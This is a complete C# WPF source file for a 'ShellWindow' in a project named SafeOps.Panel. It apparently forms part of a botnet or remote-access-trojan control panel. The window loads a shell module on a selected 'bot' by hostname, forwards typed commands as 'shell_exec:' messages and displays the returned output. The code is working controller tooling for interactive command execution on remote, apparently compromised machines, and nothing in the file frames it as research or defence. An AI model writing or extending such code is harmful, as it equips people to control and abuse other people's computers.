// ShellWindow.xaml.cs — полный файл
using System;
using System.Windows;
using System.Windows.Documents;
using System.Windows.Input;

namespace SafeOps.Panel
{
    public partial class ShellWindow : Window
    {
        private readonly MainWindow _mainWindow;
        private readonly BotInfo _bot;

        public ShellWindow(MainWindow mainWindow, BotInfo bot)
        {
            InitializeComponent();
            _mainWindow = mainWindow;
            _bot = bot;
            Title = $"Shell - {bot.Hostname}";
            _ = _mainWindow.SendCommandAsync("LOAD_MODULE shell", _bot);
            _mainWindow.ResponseReceived += OnResponseReceived;
            CommandBox.KeyDown += CommandBox_KeyDown;
            Closed += (s, e) => _mainWindow.ResponseReceived -= OnResponseReceived;
        }

        private void OnResponseReceived(object? sender, ResponseEventArgs e)
        {
            if (e.Hostname == _bot.Hostname)
            {
                string msg = e.Message;
                if (msg.StartsWith("SHELL_OUT:"))
                {
                    string output = msg.Substring(10);
                    AppendOutput(output);
                }
                else if (msg != "MODULE_LOADED_OK" && msg != "SHELL_READY:Interactive shell started")
                {
                    AppendOutput(msg);
                }
            }
        }

        private void AppendOutput(string text)
        {
            Dispatcher.Invoke(() =>
            {
                var para = new Paragraph(new Run(text + Environment.NewLine));
                OutputBox.Document.Blocks.Clear();
                OutputBox.Document.Blocks.Add(para);
                OutputBox.ScrollToEnd();
            });
        }

        private async void SendCommand(string command)
        {
            if (string.IsNullOrWhiteSpace(command)) return;
            AppendOutput($"> {command}");
            await _mainWindow.SendCommandAsync($"shell_exec:{command}", _bot);
            CommandBox.Clear();
        }

        private async void SendButton_Click(object sender, RoutedEventArgs e) => SendCommand(CommandBox.Text);
        private void CommandBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                SendCommand(CommandBox.Text);
                e.Handled = true;
            }
        }
        private void ClearButton_Click(object sender, RoutedEventArgs e) => OutputBox.Document.Blocks.Clear();
        protected override async void OnClosing(System.ComponentModel.CancelEventArgs e)
        {
            await _mainWindow.SendCommandAsync("shell_stop", _bot);
            base.OnClosing(e);
        }
    }
}